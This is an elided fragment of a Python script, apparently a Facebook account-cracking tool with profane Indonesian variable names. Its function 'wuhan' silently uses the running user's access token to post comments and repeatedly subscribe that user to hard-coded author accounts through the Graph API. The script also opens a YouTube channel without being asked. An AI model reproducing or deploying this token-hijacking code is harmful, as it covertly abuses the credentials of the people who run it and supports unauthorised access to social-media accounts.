...
#------------------------------->
koh = '100011778706856'
xi_jimpinx = '1410296929372917'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Nice😍❤💝:)', 'beautiful😘😍:v', 'تىت استى:v'])
...
def yayanxd():
    ...
    try:
        ...
        os.system('xdg-open https://youtube.com/channel/UaXA-mg')
        moch_yayan()
    except KeyError:
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/1232419763950057/comments/?message=' + send + '&access_token=' + token)
        requests.post('https://graph.facebook.com/1410296929372917/comments/?message=' + send + '&access_token=' + token)
        requests.post('https://graph.facebook.com/100011778706856/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100011778706856/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100011778706856/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100015461353597/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100015461353597/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100023853246388/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100023853246388/subscribers?access_token=%s'%(kentod))
